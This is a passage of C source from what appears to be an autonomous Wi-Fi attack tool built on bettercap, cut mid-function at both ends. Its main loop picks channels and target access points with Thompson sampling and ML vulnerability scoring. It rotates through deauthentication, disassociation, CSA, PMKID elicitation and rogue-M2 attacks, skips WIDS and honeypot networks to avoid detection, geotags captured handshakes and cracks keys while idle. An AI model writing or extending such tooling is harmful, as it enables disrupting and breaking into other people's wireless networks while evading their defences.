        { uint64_t _t0 = cpu_act_start();
        bcap_poll(ctx->bcap, 100);
        cpu_act_end(g_health_state, CPU_ACT_BCAP_POLL, _t0); }
        
        /* Event-driven AP tracking with periodic REST reconciliation.
         *
         * Primary data path: WebSocket events (wifi.ap.new/lost, wifi.client.new/lost)
         *   - Instant, zero bettercap lock contention
         *   - Handles adds, updates, and removals in real-time
         *
         * Periodic sync: Full REST poll every 60s via bcap_needs_sync()
         *   - Catches missed events, RSSI drift, reconnection edge cases
         *   - Takes ~0.3s for /api/session/wifi (vs 2.6s for full /api/session)
         *   - Only holds bettercap's Session.Lock() once per minute instead of every cycle
         *
         * Net effect: ~2.6s saved per brain cycle, bettercap processes more packets,
         * discovers more APs, catches more handshakes.
         */
        if (bcap_needs_sync(ctx->bcap)) {
            { uint64_t _t1 = cpu_act_start();
            bcap_poll_aps(ctx->bcap);
            cpu_act_end(g_health_state, CPU_ACT_BCAP_POLL_APS, _t1); }
        }
        int ap_count = bcap_get_ap_count(ctx->bcap);
        ctx->total_aps = ap_count;
        
        /* WiFi Recovery Check - detect and fix brcmfmac failures */
        if (ctx->wifi_recovery) {
            if (wifi_recovery_check(ctx->wifi_recovery, ap_count)) {
                /* Stop cracking during wifi recovery (needs full resources) */
                if (ctx->crack_mgr && ctx->crack_mgr->state == CRACK_RUNNING)
                    crack_mgr_stop(ctx->crack_mgr);
                fprintf(stderr, "[brain] WiFi recovery triggered (APs=%d)\n", ap_count);
                if (ctx->on_attack_phase) {
                    ctx->on_attack_phase(8, ctx->callback_user_data);
                }
                
                /* Perform recovery */
                wifi_recovery_result_t result = wifi_recovery_perform(
                    ctx->wifi_recovery, 
                    NULL  /* bcap_run callback - not needed, we restart services */
                );
                
                if (result == WIFI_RECOVERY_MAX_ATTEMPTS) {
                    fprintf(stderr, "[brain] Max recovery attempts - rebooting!\n");
                    wifi_recovery_reboot(ctx->wifi_recovery);
                } else if (result == WIFI_RECOVERY_SUCCESS) {
                    fprintf(stderr, "[brain] WiFi recovery successful\n");
                    /* Reset blind counter since we just recovered */
                    ctx->epoch.blind_for = 0;
                    /* Give bettercap time to restart scanning */
                    sleep(5); update_mobility(ctx); sleep(5);
                    continue;
                }
            }
        }
        
        /* Check for blind mode (no APs visible) */
        if (ap_count == 0) {
            ctx->epoch.blind_for++;
            
            /* Legacy restart logic (before wifi_recovery kicks in) */
            if (ctx->epoch.blind_for >= ctx->config.mon_max_blind_epochs) {
                fprintf(stderr, "[brain] %d epochs without APs - wifi_recovery should handle this\n",
                        ctx->epoch.blind_for);
                ctx->epoch.blind_for = 0;
            }
            
            brain_set_mood(ctx, MOOD_LONELY);
            /* Sprint 8: Periodic AP DB maintenance */
        if (ctx->epoch.epoch_num > 0 && ctx->epoch.epoch_num % 100 == 0) {
            ap_db_prune(90);
            fprintf(stderr, "[brain] [ap_db] maintenance: %d upserts this session\n",
                ctx->ap_db_upsert_count);
        }

        brain_epoch_next(ctx);
            /* Don't call brain_update_mood here - LONELY is correct when blind */

            /* Idle cracking: start if not already running */
            if (ctx->crack_mgr) {
                if (ctx->crack_mgr->state == CRACK_RUNNING) {
                    if (crack_mgr_check(ctx->crack_mgr)) {
                        fprintf(stderr, "[crack] *** KEY FOUND (blind)! ***\n");
                        if (ctx->on_attack_phase)
                            ctx->on_attack_phase(10, ctx->callback_user_data);
                    }
                } else if (!crack_mgr_exhausted(ctx->crack_mgr)) {
                    crack_mgr_start(ctx->crack_mgr);
                    if (ctx->on_attack_phase)
                        ctx->on_attack_phase(9, ctx->callback_user_data);
                }
            }

            /* Sleep recon_time but check mobility every 5s */
            {
                int _blind_sleep_s = ctx->config.recon_time;
                for (int _i = 0; _i < _blind_sleep_s && ctx->running; _i += 5) {
                    int _chunk = (_blind_sleep_s - _i) < 5 ? (_blind_sleep_s - _i) : 5;
                    sleep(_chunk);
                    update_mobility(ctx);
                }
            }
            continue;
        }
        
        ctx->epoch.blind_for = 0;
        
        /* Sprint 4 #9: Update mobility score */
        update_mobility(ctx);

        /* Home mode REMOVED — skip-after-capture handles idle automatically.
         * Hash sync runs during sync_window mode. Crack manager runs when bored. */

        /* Sprint 6 #17: Geo-fence check */
        if (!geo_fence_check(ctx)) {
            fprintf(stderr, "[brain] [geo-fence] outside fence -- skipping attacks\n");
            sleep(5); update_mobility(ctx); sleep(5);
            brain_epoch_next(ctx);
            brain_update_mood(ctx);
            continue;
        }

        /* Phase 1D: Rebuild channel map per-epoch with fresh AP data */
        {
            int _cmn = ap_count;
            if (_cmn > 0 && _cmn <= 256) {
                int _cch[256], _ccl[256], _crs[256];
                bool _ccp[256];
                for (int ai = 0; ai < _cmn; ai++) {
                    bcap_ap_t _cma;
                    if (bcap_get_ap(ctx->bcap, ai, &_cma) == 0) {
                        _cch[ai] = _cma.channel;
                        _ccl[ai] = _cma.clients_count;
                        _crs[ai] = _cma.rssi;
                        char _cmm[18];
                        mac_to_str(&_cma.bssid, _cmm);
                        _ccp[ai] = (get_handshake_quality(_cmm) == HS_QUALITY_FULL);
                    } else {
                        _cch[ai] = 0; _ccl[ai] = 0; _crs[ai] = -100; _ccp[ai] = false;
                    }
                }
                channel_map_build(&ctx->channel_map, _cch, _ccl, _ccp, _crs, _cmn, NULL);

                /* AUDIT FIX: Blend ML channel yield into channel_map (same as init) */
                {
                    channel_query_t _cq2;
                    float _ml_yield2[14];
                    time_t _cqt2 = time(NULL);
                    struct tm *_cqtm2 = localtime(&_cqt2);
                    _cq2.time_of_day = _cqtm2 ? (float)_cqtm2->tm_hour / 24.0f : 0.5f;
                    _cq2.gps_zone = 0.0f;
                    _cq2.day_of_week = _cqtm2 ? (float)_cqtm2->tm_wday / 7.0f : 0.5f;
                    if (predict_channel_yield(&_cq2, _ml_yield2) == 0) {
                        for (int ci = 0; ci < ctx->channel_map.count; ci++) {
                            int ch2 = ctx->channel_map.entries[ci].channel;
                            if (ch2 >= 1 && ch2 <= 14) {
                                float ml_boost = _ml_yield2[ch2 - 1] * CMAP_W_UNCAPTURED * 0.2f;
                                ctx->channel_map.entries[ci].expected_yield += ml_boost;
                            }
                        }
                    }
                }
            }
        }

        /* Build channel list from visible APs */
        int channel_counts[256] = {0};
        int channels[BRAIN_MAX_CHANNELS];
        int ap_counts_per_channel[BRAIN_MAX_CHANNELS];
        int num_channels = 0;
        
        for (int i = 0; i < ap_count; i++) {
            bcap_ap_t ap;
            if (bcap_get_ap(ctx->bcap, i, &ap) == 0) {
                int ch = ap.channel;
                if (ch > 0 && ch <= 165) {  /* 2.4GHz (1-14) + 5GHz (36-165) */
                    if (channel_counts[ch] == 0) {
                        channels[num_channels] = ch;
                        ap_counts_per_channel[num_channels] = 0;
                        num_channels++;
                        if (num_channels >= BRAIN_MAX_CHANNELS) break;
                    }
                    channel_counts[ch]++;
                }
            }
        }
        
        /* Fill ap_counts_per_channel array for channel bandit */
        for (int i = 0; i < num_channels; i++) {
            ap_counts_per_channel[i] = channel_counts[channels[i]];
        }
        
        /* Use Thompson-based channel selection instead of static sorting */
        int selected_ch = cb_select_channel(&ctx->channel_bandit, channels, num_channels, ap_counts_per_channel);
        
        /* Reorder channels: selected channel first, rest sorted by Thompson score.
         * O(n log n) via qsort instead of O(n³) repeated selection. */
        if (selected_ch > 0 && num_channels > 1) {
            /* Sample Thompson scores for all channels in one pass */
            typedef struct { int channel; int ap_count; float score; } ch_score_t;
            ch_score_t ch_scores[BRAIN_MAX_CHANNELS];
            time_t _now = time(NULL);
            int score_count = 0;
            int selected_idx = -1;

            for (int i = 0; i < num_channels; i++) {
                int ch = channels[i];
                if (ch == selected_ch) { selected_idx = i; continue; }
                cb_channel_t *c = &ctx->channel_bandit.channels[ch];
                float prob = ts_beta_sample(c->alpha, c->beta);
                float explore = 0.0f;
                if (c->last_visited > 0) {
                    float hrs = (float)(_now - c->last_visited) / 3600.0f;
                    explore = ctx->channel_bandit.exploration_bonus * fminf(hrs, 2.0f) / 2.0f;
                } else {
                    explore = ctx->channel_bandit.exploration_bonus;
                }
                ch_scores[score_count].channel = ch;
                ch_scores[score_count].ap_count = ap_counts_per_channel[i];
                ch_scores[score_count].score = (prob + explore) * (1.0f + 0.1f * (float)ap_counts_per_channel[i]);
                score_count++;
            }

            /* Sort remaining channels by score descending */
            for (int a = 0; a < score_count - 1; a++) {
                for (int b = a + 1; b < score_count; b++) {
                    if (ch_scores[b].score > ch_scores[a].score) {
                        ch_score_t tmp = ch_scores[a];
                        ch_scores[a] = ch_scores[b];
                        ch_scores[b] = tmp;
                    }
                }
            }

            /* Rebuild: selected first, then sorted rest */
            int ordered_idx = 0;
            if (selected_idx >= 0) {
                int tmp_ch = channels[selected_idx];
                int tmp_cnt = ap_counts_per_channel[selected_idx];
                channels[0] = tmp_ch;
                channel_counts[tmp_ch] = tmp_cnt;
                ordered_idx = 1;
            }
            for (int i = 0; i < score_count && ordered_idx < num_channels; i++) {
                channels[ordered_idx] = ch_scores[i].channel;
                channel_counts[ch_scores[i].channel] = ch_scores[i].ap_count;
                ordered_idx++;
            }
            num_channels = ordered_idx;
        }
            
        /* Phase 1D: Apply channel_map yield-sorted order (overrides Thompson when available) */
        {
            channel_attack_order_t _corder;
            channel_map_get_attack_order(&ctx->channel_map, &_corder);
            if (_corder.count > 0) {
                /* Use channel_map order: channels sorted by yield score */
                int new_count = 0;
                for (int ci = 0; ci < _corder.count && new_count < BRAIN_MAX_CHANNELS; ci++) {
                    /* Only include channels that were found in the scan */
                    for (int si = 0; si < num_channels; si++) {
                        if (channels[si] == _corder.channels[ci]) {
                            if (new_count != si) {
                                /* Swap into position */
                                int tmp_ch = channels[new_count];
                                channels[new_count] = channels[si];
                                channels[si] = tmp_ch;
                            }
                            new_count++;
                            break;
                        }
                    }
                }
                fprintf(stderr, "[brain] channel order (yield-sorted): ");
                for (int ci = 0; ci < num_channels; ci++) {
                    int listen = channel_map_get_listen_ms(&ctx->channel_map, channels[ci]);
                    fprintf(stderr, "ch%d(%dms) ", channels[ci], listen);
                }
                fprintf(stderr, "\n");
            }
        }

        fprintf(stderr, "[brain] epoch %d: attack_phase=%s\n",
                ctx->epoch.epoch_num,
                (ctx->epoch.epoch_num % 8 == 0) ? "AUTH_ASSOC" :
                (ctx->epoch.epoch_num % 8 == 1) ? "CSA" :
                (ctx->epoch.epoch_num % 8 == 2) ? "DEAUTH+BCAST" :
                (ctx->epoch.epoch_num % 8 == 3) ? "ANON_REASSOC" :
                (ctx->epoch.epoch_num % 8 == 4) ? "DISASSOC" :
                (ctx->epoch.epoch_num % 8 == 5) ? "ROGUE_M2" :
                (ctx->epoch.epoch_num % 8 == 6) ? "PROBE" : "LISTEN");
        fprintf(stderr, "[brain] channel order (Thompson): ");
        for (int i = 0; i < num_channels; i++) {
            fprintf(stderr, "ch%d(%d) ", channels[i], channel_counts[channels[i]]);
        }
        fprintf(stderr, "\n");
        
        /* Fire attack phase callback for UI — but only if we actually have targets.
         * If all APs are conquered, skip the callback so the mood (BORED)
         * can display instead of fake attack text cycling on screen. */
        bool _bored_skip = should_really_be_bored(ctx);
        if (!_bored_skip) {
            int _ui_phase = ctx->epoch.epoch_num % 8;
            if (ctx->on_attack_phase) {
                ctx->on_attack_phase(_ui_phase, ctx->callback_user_data);
            }
        }

        /* ── Phase 2B: Driving mode sweep lifecycle ─────────────── */
        if (ctx->mobility_ctx.current_mode == MOBILITY_DRIVING && ctx->driving.active) {
            drv_sweep_begin(&ctx->driving);
            /* Override channel order with driving mode's optimized 1/6/11-first order */
            int drv_channels[DRV_MAX_CHANNELS];
            int drv_ch_count = 0;
            drv_get_channel_order(&ctx->driving, drv_channels, &drv_ch_count);
            /* Replace channel list: only use channels visible in scan */
            int drv_final[DRV_MAX_CHANNELS];
            int drv_final_count = 0;
            for (int di = 0; di < drv_ch_count; di++) {
                for (int si = 0; si < num_channels; si++) {
                    if (channels[si] == drv_channels[di]) {
                        drv_final[drv_final_count++] = drv_channels[di];
                        break;
                    }
                }
            }
            if (drv_final_count > 0) {
                for (int di = 0; di < drv_final_count; di++)
                    channels[di] = drv_final[di];
                num_channels = drv_final_count;
            }
        }

        /* ── Phase 2D: Walking mode epoch + secondary channel learning ── */
        if (ctx->mobility_ctx.current_mode == MOBILITY_WALKING && ctx->walking.active) {
            ctx->walking.stats.epochs++;
            ctx->walking.stats.scans++;
            /* Override channel list with walking mode's primary + learned secondaries */
            uint8_t walk_ch_buf[WALK_NUM_PRIMARY + WALK_SECONDARY_MAX];
            int walk_ch_count = walk_get_scan_channels(&ctx->walking, walk_ch_buf,
                                                       WALK_NUM_PRIMARY + WALK_SECONDARY_MAX);
            if (walk_ch_count > 0) {
                /* Merge: walking channels first, then any remaining scan channels */
                int merged[BRAIN_MAX_CHANNELS];
                int merged_count = 0;
                for (int wi = 0; wi < walk_ch_count && merged_count < BRAIN_MAX_CHANNELS; wi++) {
                    /* Only include if actually seen in scan */
                    for (int si = 0; si < num_channels; si++) {
                        if (channels[si] == (int)walk_ch_buf[wi]) {
                            merged[merged_count++] = (int)walk_ch_buf[wi];
                            break;
                        }
                    }
                }
                /* Append remaining channels not already in merged */
                for (int si = 0; si < num_channels && merged_count < BRAIN_MAX_CHANNELS; si++) {
                    bool already = false;
                    for (int mi = 0; mi < merged_count; mi++) {
                        if (merged[mi] == channels[si]) { already = true; break; }
                    }
                    if (!already) merged[merged_count++] = channels[si];
                }
                for (int mi = 0; mi < merged_count; mi++)
                    channels[mi] = merged[mi];
                num_channels = merged_count;
            }
        }

        /* ── Phase 2C: Stationary mode phase gating ────────────────────── */
        bool stat_soak_active = false;
        if (ctx->mobility_ctx.current_mode == MOBILITY_STATIONARY && ctx->stationary.active) {
            if (ctx->stationary.phase == STAT_PHASE_SOAK || ctx->stationary.permanent_soak) {
                /* SOAK phase: zero injection, just listen for EAPOL completions */
                stat_soak_active = true;
                fprintf(stderr, "[brain] [stationary] SOAK phase — passive listen only\n");
            } else if (ctx->stationary.phase == STAT_PHASE_SCAN) {
                /* SCAN phase: just observe, don't attack (building triage list) */
                fprintf(stderr, "[brain] [stationary] SCAN phase — observing\n");
            }
        }

        /* Iterate through channels */
        for (int c = 0; c < num_channels && ctx->running; c++) {
            int ch = channels[c];
            
            /* Set channel */
            { uint64_t _t0 = cpu_act_start();
            brain_set_channel(ctx, ch);
            cpu_act_end(g_health_state, CPU_ACT_CHANNEL_HOP, _t0); }
            
            /* Get APs on this channel */
            ctx->aps_on_channel = channel_counts[ch];
            
            /* Phase 2B: Driving mode per-channel entry */
            int drv_dwell_ms = 0;
            if (ctx->mobility_ctx.current_mode == MOBILITY_DRIVING && ctx->driving.active) {
                drv_dwell_ms = drv_enter_channel(&ctx->driving, ch);
            }

            /* Build candidate list for Thompson Sampling */
            ts_entity_t *candidates[64];
            int candidate_count = 0;
            
            /* Adapt stealth level based on AP density */
            if (ctx->stealth) {
                stealth_adapt_level(ctx->stealth, ap_count);
            }

            /* Iterate APs and register with Thompson brain */
            for (int i = 0; i < ap_count && ctx->running && candidate_count < 64; i++) {
                bcap_ap_t ap;
                if (bcap_get_ap(ctx->bcap, i, &ap) != 0) continue;
                if (ap.channel != ch) continue;

                /* Whitelist: attack until captured, then skip via 3-layer check below.
                 * Stealth whitelist now stores PSK for future auto-connect only. */

                /* Skip WIDS/honeypot APs */
                if (ctx->stealth && stealth_is_wids_ap(ctx->stealth, ap.ssid)) {
                    fprintf(stderr, "[brain] Skipping WIDS AP: %s\n", ap.ssid);
                    continue;
                }

                /* Filter weak signals */
                /* Sprint 8: Upsert AP into persistent database */
                char _bssid_str[18];
                {
                    mac_to_str(&ap.bssid, _bssid_str);
                    /* FIX: Only write GPS when has_fix is true.
                     * Previously, stale lat/lon from a timed-out GPS session
                     * would overwrite the DB with wherever we WERE, not where
                     * we ARE. This caused map markers to not update properly
                     * on subsequent walks past the same APs. */
                    double _lat = 0.0, _lon = 0.0;
                    if (ctx->gps && ctx->gps->has_fix &&
                        (ctx->gps->latitude != 0.0 || ctx->gps->longitude != 0.0)) {
                        _lat = ctx->gps->latitude;
                        _lon = ctx->gps->longitude;
                    }
                    ap_db_upsert(_bssid_str, ap.ssid, ap.encryption, ap.vendor,
                                ap.channel, ap.rssi, _lat, _lon);
                    ctx->ap_db_upsert_count++;
                }

                /* Build BSSID string for handshake lookups (needed before
                 * weak-AP filter so GPS refinement can run on all seen APs) */
                char _hs_mac[18];
                snprintf(_hs_mac, sizeof(_hs_mac), "%02x:%02x:%02x:%02x:%02x:%02x",
                    ap.bssid.addr[0], ap.bssid.addr[1], ap.bssid.addr[2],
                    ap.bssid.addr[3], ap.bssid.addr[4], ap.bssid.addr[5]);
                hs_quality_t _hs_q = get_handshake_quality(_hs_mac);

                /* GPS refinement: update stored GPS if we are closer now.
                 * MUST run BEFORE the weak-AP filter! Even weak APs (-76 to -90 dBm)
                 * are valuable for GPS refinement when we already have a handshake.
                 * The RSSI gating inside gps_refine_check handles whether the signal
                 * is strong enough to improve position accuracy. */
                if (_hs_q != HS_QUALITY_NONE && ctx->gps &&
                    (ctx->gps->has_fix ||
                     (ctx->gps->latitude != 0.0 && ctx->gps->longitude != 0.0))) {
                    const char *_pcap = get_hs_pcap_path(_hs_mac);
                    if (_pcap) {
                        gps_refine_check(_hs_mac, ap.rssi, ctx->gps, _pcap);
                    } else {
                        /* Debug: pcap path not in cache — could be format mismatch */
                        static int _pcap_miss_count = 0;
                        if (++_pcap_miss_count <= 5) {
                            fprintf(stderr, "[gps-refine] SKIP %s: no pcap_path in cache (hs_q=%d)\n",
                                    _hs_mac, (int)_hs_q);
                        }
                    }
                } else if (_hs_q != HS_QUALITY_NONE) {
                    /* Debug: has handshake but no GPS context */
                    static int _gps_miss_count = 0;
                    if (++_gps_miss_count <= 3) {
                        fprintf(stderr, "[gps-refine] SKIP %s: no GPS (gps=%p has_fix=%d lat=%.4f lon=%.4f)\n",
                                _hs_mac, (void*)ctx->gps,
                                ctx->gps ? ctx->gps->has_fix : -1,
                                ctx->gps ? ctx->gps->latitude : 0.0,
                                ctx->gps ? ctx->gps->longitude : 0.0);
                    }
                }

                if (ctx->config.filter_weak && ap.rssi < ctx->config.min_rssi) {
                    fprintf(stderr, "[brain] skip weak AP: %s (%ddBm < %ddBm)\n",
                            ap.ssid, ap.rssi, ctx->config.min_rssi);
                    continue;
                }
                /* Check if this AP is an orphan needing rescan (reconciliation-inserted) */
                bool _needs_rescan = ap_db_needs_rescan(_bssid_str);

                if (_hs_q == HS_QUALITY_FULL && !_needs_rescan) {
                    /* Already have crackable handshake and not orphan — skip entirely */
                    continue;
                }
                /* AUDIT FIX: Skip APs with live EAPOL captures detected */
                {
                    uint8_t _ebssid[6];
                    memcpy(_ebssid, ap.bssid.addr, 6);
                    if (eapol_monitor_has_capture(&ctx->eapol_mon, _ebssid)) {
                        continue;  /* EAPOL monitor already detected capture */
                    }
                }

                int _has_hs = (_hs_q == HS_QUALITY_PARTIAL || _hs_q == HS_QUALITY_PMKID);
                
                /* Skip blacklisted APs (too many failed deauths, retried after TTL) */
                if (brain_is_blacklisted(ctx, _hs_mac)) {
                    continue;
                }
                
                /* Register/update entity in Thompson brain */
                char mac_str[BRAIN_MAC_STR_LEN];
                mac_to_str(&ap.bssid, mac_str);
                
                ts_entity_t *entity = ts_get_or_create_entity(ctx->thompson, mac_str);
                if (entity) {
                    /* Update metadata for soft identity */
                    ts_update_entity_metadata(entity, ap.ssid, ap.vendor,
                                              ap.channel, ap.beacon_interval,
                                              ap.encryption);
                    
                    /* Update signal tracker */
                    ts_update_signal(entity, ap.rssi);
                    /* AUDIT FIX: Record RSSI trend via attack tracker */
                    {
                        brain_attack_tracker_t *_atrk = get_attack_tracker(ctx, mac_str);
                        if (_atrk) {
                            rssi_trend_record(&_atrk->rssi_trend, (int8_t)ap.rssi);
                        }
                    }

                    /* AUDIT FIX: AP Triage classification */
                    {
                        ap_triage_input_t _tri_in;
                        ap_triage_result_t _tri_out;
                        memset(&_tri_in, 0, sizeof(_tri_in));
                        memset(&_tri_out, 0, sizeof(_tri_out));
                        _tri_in.rssi = (int8_t)ap.rssi;
                        _tri_in.clients_count = ap.clients_count;
                        strncpy(_tri_in.encryption, ap.encryption, sizeof(_tri_in.encryption) - 1);
                        _tri_in.handshake_captured = (_hs_q == HS_QUALITY_FULL);
                        _tri_in.pmkid_available = (_hs_q == HS_QUALITY_PMKID);
                        _tri_in.is_whitelisted = (ctx->stealth && stealth_is_whitelisted(ctx->stealth, ap.ssid));
                        _tri_in.is_blacklisted = brain_is_blacklisted(ctx, mac_str);
                        if (entity) {
                            _tri_in.thompson_alpha = entity->alpha;
                            _tri_in.thompson_beta = entity->beta;
                            _tri_in.client_boost = entity->client_boost;
                        }
                        _tri_in.now = time(NULL);
                        ap_triage_classify(&_tri_in, &_tri_out);

                        if (_tri_out.tier == TRIAGE_SKIP) {
                            continue;  /* Triage says skip entirely */
                        }
                        /* Phase 2A: Triage tier priority — Gold>Silver>Bronze>Exploit */
                        if (entity) {
                            float _triage_boost = 0.0f;
                            switch (_tri_out.tier) {
                                case TRIAGE_GOLD:    _triage_boost = 0.6f; break;
                                case TRIAGE_SILVER:  _triage_boost = 0.3f; break;
                                case TRIAGE_BRONZE:  _triage_boost = 0.1f; break;
                                case TRIAGE_EXPLOIT: _triage_boost = 0.4f; break;
                                default: break;
                            }
                            entity->client_boost += _triage_boost;
                        }
                    }

                    /* AUDIT FIX: ML vulnerability prediction — use make_ap_features()
                     * for correct vendor_category, encryption_type, beacon_flag */
                    {
                        time_t _mlt = time(NULL);
                        struct tm *_mltm = localtime(&_mlt);
                        int _ml_hour = _mltm ? _mltm->tm_hour : 12;
                        ap_features_t _ml_feat = make_ap_features(
                            ap.vendor, ap.encryption, ap.channel, ap.ssid,
                            ap.clients_count, ap.rssi, _ml_hour);
                        float _ml_vuln = predict_vulnerability(&_ml_feat);
                        if (entity && _ml_vuln > 0.0f) {
                            entity->client_boost += _ml_vuln * 0.3f;
                        }
                    }
                    
                    /* AUDIT FIX: MOOD_JACKPOT for strong new uncaptured AP */
                    if (ap.rssi >= -50 && ap.clients_count > 0 && _hs_q == HS_QUALITY_NONE) {
                        brain_set_mood(ctx, MOOD_JACKPOT);
                        fprintf(stderr, "[brain] JACKPOT! Strong AP: %s %ddBm ch%d clients=%d\n",
                                ap.ssid, ap.rssi, ap.channel, ap.clients_count);
                    }

                    /* Phase 2D: Walking mode — proximity alerts + target tracking */
                    if (ctx->mobility_ctx.current_mode == MOBILITY_WALKING && ctx->walking.active) {
                        walk_target_t *_wt = walk_update_target(&ctx->walking, mac_str, ap.ssid,
                                          (int8_t)ap.rssi, ap.channel, ap.clients_count,
                                          (_hs_q == HS_QUALITY_FULL));
                        if (_wt) {
                            /* Feed triage score from AP triage system */
                            brain_attack_tracker_t *_watrk = get_attack_tracker(ctx, mac_str);
                            if (_watrk) {
                                rssi_trend_info_t _wrti;
                                rssi_trend_classify(&_watrk->rssi_trend, &_wrti);
                                _wt->strategy = walk_get_strategy(_wrti.trend);
                            }
                        }
                        if (walk_check_proximity(&ctx->walking, mac_str, ap.ssid,
                                                 (int8_t)ap.rssi, ap.clients_count)) {
                            brain_set_mood(ctx, MOOD_JACKPOT);
                            fprintf(stderr, "[brain] [walk-prox] %s\n",
                                    walk_get_proximity_text(&ctx->walking));
                        }
                    }

                    /* Phase 2B: Driving mode — GPS breadcrumb + association filter */
                    if (ctx->mobility_ctx.current_mode == MOBILITY_DRIVING && ctx->driving.active) {
                        double _blat = 0.0, _blon = 0.0;
                        if (ctx->gps && ctx->gps->has_fix) {
                            _blat = ctx->gps->latitude;
                            _blon = ctx->gps->longitude;
                        }
                        drv_add_breadcrumb(&ctx->driving, mac_str, ap.ssid,
                                          (int8_t)ap.rssi, ap.channel,
                                          _blat, _blon, false);

                        /* Orphan APs (from reconciliation): massive priority boost.
                         * These are APs we have handshakes for but never scanned —
                         * we need bettercap to see them so the DB gets populated
                         * with encryption, vendor, channel, clients, GPS refinement. */
                        if (_needs_rescan && entity) {
                            entity->client_boost += 5.0f;
                            fprintf(stderr, "[brain] [drv-rescan] %s needs rescan — boosted\n", ap.ssid);
                        }

                        /* Use driving mode's association filter (skip weak, already-captured, etc.)
                         * But exempt orphan/rescan APs — they must be processed */
                        bool _pmkid_avail = (_hs_q == HS_QUALITY_PMKID);
                        if (!_needs_rescan && !drv_should_associate(&ctx->driving, ap.channel,
                                                 (int8_t)ap.rssi, (_hs_q == HS_QUALITY_FULL),
                                                 _pmkid_avail)) {
                            /* Driving filter rejected — skip this AP as candidate */
                            if (candidate_count > 0 && candidates[candidate_count - 1] == entity)
                                candidate_count--;
                        }
                    }

                    /* Phase 2C: Stationary mode — feed EAPOL state for circle-back tracking */
                    if (ctx->mobility_ctx.current_mode == MOBILITY_STATIONARY && ctx->stationary.active) {
                        /* Check EAPOL monitor for M1/M2 state on this BSSID */
                        uint8_t _sbssid[6];
                        memcpy(_sbssid, ap.bssid.addr, 6);
                        eapol_state_t _estate = eapol_monitor_get_state(&ctx->eapol_mon, _sbssid);
                        bool _s_has_m1 = (_estate >= EAPOL_STATE_M1);
                        bool _s_has_m2 = (_estate >= EAPOL_STATE_M1M2);
                        stat_record_eapol_state(&ctx->stationary, mac_str, _s_has_m1, _s_has_m2);

                        /* During CIRCLE phase, boost circle-back candidates */
                        if (ctx->stationary.phase == STAT_PHASE_CIRCLE &&
                            stat_is_circle_back(&ctx->stationary, mac_str) && entity) {
                            entity->client_boost += 2.0f;  /* Strong boost for M1-only APs */
                            fprintf(stderr, "[brain] [stat-circle] %s: M1 only, boosting for circle-back\n", ap.ssid);
                        }
                    }

                    /* Boost score for APs with clients (better handshake targets) */
                    if (ap.clients_count > 0) {
                        /* More clients = higher chance of capturing handshake on deauth */
                        entity->client_boost = 1.0f + (0.2f * (float)ap.clients_count);
                        if (_has_hs) entity->client_boost *= 0.4f;
                    } else {
                        entity->client_boost = _has_hs ? 0.15f : 0.5f;
                    }

                    /* Orphan AP boost (all modes): APs from reconciliation that
                     * have never been live-scanned get priority so bettercap can
                     * fill in encryption, vendor, channel, client data, and GPS. */
                    if (_needs_rescan) {
                        entity->client_boost += 3.0f;
                        if (ctx->mobility_ctx.current_mode != MOBILITY_DRIVING) {
                            fprintf(stderr, "[brain] [rescan] %s needs rescan — boosted\n", ap.ssid);
                        }
                    }
                    
                    /* Store RSSI for sorting */
                    entity->last_rssi = ap.rssi;
                    candidates[candidate_count++] = entity;
                }
            }

            /* Sort candidates by signal strength (strongest first) — O(n log n) */
            if (candidate_count > 1) {
                qsort(candidates, candidate_count, sizeof(ts_entity_t *), cmp_candidate_rssi);
            }

            /* Cap to top 3 candidates per channel - don't waste CPU on weak APs */
            #define MAX_CANDIDATES_PER_CH 3
            if (candidate_count > MAX_CANDIDATES_PER_CH) {
                if (candidate_count > MAX_CANDIDATES_PER_CH + 1) {
                    fprintf(stderr, "[brain] ch%d: capped %d->%d candidates (weakest dropped: %ddBm)\n",
                            ch, candidate_count, MAX_CANDIDATES_PER_CH,
                            candidates[candidate_count - 1]->last_rssi);
                }
                candidate_count = MAX_CANDIDATES_PER_CH;
            }

            /* Debug: show candidate count */
            if (candidate_count == 0) {
                fprintf(stderr, "[brain] ch%d: no candidates (ap_count=%d)\n", ch, ap_count);
                /* If NO candidates on ANY channel, all APs are conquered.
                 * Skip remaining channels this epoch to save CPU. */
                if (ap_count > 0 && should_really_be_bored(ctx)) {
                    fprintf(stderr, "[brain] ALL APs conquered - skipping attack cycle, idle 30s\n");
                    brain_epoch_next(ctx);
                    brain_update_mood(ctx);
                    /* Run idle cracking while we wait */
                    if (ctx->crack_mgr) {
                        if (ctx->crack_mgr->state == CRACK_RUNNING) {
                            if (crack_mgr_check(ctx->crack_mgr)) {
                                fprintf(stderr, "[crack] *** KEY FOUND (bored)! ***\n");
                                if (ctx->on_attack_phase)
                                    ctx->on_attack_phase(10, ctx->callback_user_data);
                            }
                        } else if (!crack_mgr_exhausted(ctx->crack_mgr)) {
                            crack_mgr_start(ctx->crack_mgr);
                            /* Show crack face when starting idle */
                            if (ctx->on_attack_phase)
                                ctx->on_attack_phase(9, ctx->callback_user_data);
                        }
                    }
                    /* Sleep 30s but check mobility every 5s */
                    for (int _i = 0; _i < 6 && ctx->running; _i++) {
                        sleep(5);
                        update_mobility(ctx);
                    }
                    goto epoch_end;
                }
            } else {
                fprintf(stderr, "[brain] ch%d: %d candidates (mode=%s)\n", ch, candidate_count, 
                        ts_mode_name(ctx->current_mode));
            }

            /* Mode-specific behavior */
            if (ctx->current_mode == MODE_PASSIVE_DISCOVERY) {
                cb_update_stats(&ctx->channel_bandit, ch, channel_counts[ch]);
                /* fall through to attack logic */
            }
            
            if (ctx->current_mode == MODE_COOLDOWN) {
                sleep(3);
                /* fall through */
            }

            /* Phase 2C: Stationary SOAK/SCAN phase — skip attacks entirely */
            if (stat_soak_active || (ctx->mobility_ctx.current_mode == MOBILITY_STATIONARY &&
                ctx->stationary.active && ctx->stationary.phase == STAT_PHASE_SCAN)) {
                /* In SOAK: passive listen only. In SCAN: observe only, build triage list. */
                int listen_ms = stat_soak_active ? 2000 : 500;
                usleep(listen_ms * 1000);
                continue;  /* Next channel — no attacks */
            }



            /* ===== STAGGERED ATTACK SCHEDULING (AngryOxide-inspired) ===== */
            /* Each epoch runs ONE attack type. Prevents EAPOL timer resets.
             * Epoch % 4:
             *   0 = PMKID elicitation (wifi.assoc) - all APs, even 0 clients
             *   1 = CSA attack (wifi.channel_switch_announce) - APs with clients
             *   2 = Targeted deauth (wifi.deauth per client) - APs with clients  
             *   3 = Passive listen (no attacks, just observe) - lets handshakes complete
             */
            /* Attack phase: Thompson Sampling per-AP (#2) with epoch%8 fallback */
